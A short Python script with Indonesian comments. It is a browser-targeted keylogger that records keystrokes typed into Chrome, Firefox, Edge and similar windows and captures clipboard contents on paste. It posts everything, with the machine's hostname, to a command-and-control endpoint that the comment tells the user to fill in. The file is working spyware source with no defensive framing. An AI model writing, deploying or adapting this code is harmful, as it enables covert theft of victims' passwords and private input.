import socket
import pyperclip
import keyboard
import requests


def act_win_pn():
    # Simulasi mendapatkan jendela aktif
    return (1234, "chrome.exe", "Google Chrome")


def browserList(text):
    # Periksa apakah proses berada dalam daftar target browser
    target_browsers = ["chrome.exe", "brave.exe", "firefox.exe", "safari.exe", "msedge.exe"]
    return text.lower() in target_browsers


def GetTextFromClipboard():
    return pyperclip.paste()


def save_log(log, text, caption):
    global key_log
    r = {
        'gid': "sType",
        'pid': "gType",
        'pcname': socket.gethostname(),
        'processname': text,
        'windowname': caption,
        'data': log,
    }
    host2 = "http://{HOST}:{PORT}"  # Ganti dengan C2 server Anda
    requests.post(host2 + "/api/clip", data=r)
    key_log = ""  # Reset log setelah mengirim


def OnKeyboardEvent(event):
    (pid, text, caption) = act_win_pn()
    if browserList(text):
        global key_log
        key = event.name

        if keyboard.is_pressed('ctrl'):
            key = f"<{event.name}>"
        elif key == 'enter':
            key = "\n"
        elif len(key) == 1:
            key = key
        else:
            key = f"<{event.name}>"

        if keyboard.is_pressed('ctrl') and event.name.lower() == 'v':
            key += GetTextFromClipboard()

        key_log += key

        if key == "\n" and len(key_log):
            save_log(key_log, text, "extension")

        else:
            if len(key_log):
                save_log(key_log, text, "extension")

    return True


keyboard.on_press(OnKeyboardEvent)
keyboard.wait()
